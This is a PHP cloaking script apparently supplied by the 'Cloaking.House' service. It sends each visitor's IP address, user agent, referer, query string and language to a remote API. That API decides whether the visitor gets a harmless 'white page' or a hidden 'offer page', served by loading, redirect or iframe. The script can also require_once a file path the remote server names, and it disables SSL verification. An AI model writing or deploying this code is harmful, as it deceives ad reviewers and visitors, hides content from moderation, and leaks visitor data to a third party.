<?php

    // Не рекомендуется вносить самостоятельно изменения в скрипт, так как любые последствия неработоспособности будут лежать на вас.
    // С уважением, Cloaking.House


    error_reporting(0);
    mb_internal_encoding('UTF-8');


    $ip_address = $_SERVER['REMOTE_ADDR'];
    $ip_headers = [
        'HTTP_CLIENT_IP', 
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_CF_CONNECTING_IP', 
        'HTTP_FORWARDED_FOR', 
        'HTTP_X_COMING_FROM', 
        'HTTP_COMING_FROM', 
        'HTTP_FORWARDED_FOR_IP', 
        'HTTP_X_REAL_IP'
    ];

    
    if ( ! empty($ip_headers)) {
        foreach($ip_headers AS $header)
        {
            if ( ! empty($_SERVER[$header])) {
                $ip_address = trim($_SERVER[$header]);
                break;
            }
        }
    }


    $request_data = [
        'label'         => '7d89c9959af0a2d22ef2d53e623ade55', 
        'user_agent'    => $_SERVER['HTTP_USER_AGENT'], 
        'referer'       => ! empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '', 
        'query'         => ! empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '', 
        'lang'          => ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '',
        'ip_address'    => $ip_address
    ];
        

    if (function_exists('curl_version')) {

        $request_data = http_build_query($request_data);
        $ch = curl_init('https://cloakit.house/api/v1/check');
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER  => TRUE,
            CURLOPT_CUSTOMREQUEST   => 'POST',
            CURLOPT_SSL_VERIFYPEER  => FALSE,
            CURLOPT_TIMEOUT         => 15,
            CURLOPT_POSTFIELDS      => $request_data
        ]);


        $result = curl_exec($ch);
        $info   = curl_getinfo($ch);
        curl_close($ch);


        if ( ! empty($info) && $info['http_code'] == 200) {
            $body = json_decode($result, TRUE);

            
            if ( ! empty($body['filter_type']) && $body['filter_type'] == 'subscription_expired') {
                exit('Your Subscription Expired.');
            }
           

            if ( ! empty($body['url_white_page']) && ! empty($body['url_offer_page'])) {

                // Options
                $сontext_options = ['ssl' => ['verify_peer' => FALSE, 'verify_peer_name' => FALSE], 'http' => ['header' => 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']]];
                
                // Offer Page
                if ($body['filter_page'] == 'offer') {
                    if ($body['mode_offer_page'] == 'loading') {
                        if (filter_var($body['url_offer_page'], FILTER_VALIDATE_URL)) {
                            echo str_replace('<head>', '<head><base href="' . $body['url_offer_page'] . '" />', file_get_contents($body['url_offer_page'], FALSE, stream_context_create($сontext_options)));
                        } elseif (file_exists($body['url_offer_page'])) {
                            if (pathinfo($body['url_offer_page'], PATHINFO_EXTENSION) == 'html') {
                                echo file_get_contents($body['url_offer_page'], FALSE, stream_context_create($сontext_options));
                            } else {
                                require_once($body['url_offer_page']);
                            }
                        } else {
                            exit('Offer Page Not Found.');
                        }
                    }

                    if ($body['mode_offer_page'] == 'redirect') {
                        header('Location: ' . $body['url_offer_page'], TRUE, 302);
                        exit(0);
                    }

                    if ($body['mode_offer_page'] == 'iframe') {
                        echo '<iframe src="' . $body['url_offer_page'] . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
                    }
                }


                // White Page
                if ($body['filter_page'] == 'white') {
                    if ($body['mode_white_page'] == 'loading') {
                        if (filter_var($body['url_white_page'], FILTER_VALIDATE_URL)) {
                            echo str_replace('<head>', '<head><base href="' . $body['url_white_page'] . '" />', file_get_contents($body['url_white_page'], FALSE, stream_context_create($сontext_options)));
                        } elseif (file_exists($body['url_white_page'])) {
                            if (pathinfo($body['url_white_page'], PATHINFO_EXTENSION) == 'html') {
                                echo file_get_contents($body['url_white_page'], FALSE, stream_context_create($сontext_options));
                            } else {
                                require_once($body['url_white_page']);
                            }
                        } else {
                            exit('White Page Not Found.');
                        }
                    }

                    if ($body['mode_white_page'] == 'redirect') {
                        header('Location: ' . $body['url_white_page'], TRUE, 302);
                        exit(0);
                    }
                }
            } 
        }
    } else {
        exit('cURL is not supported on the hosting.');
    }


?>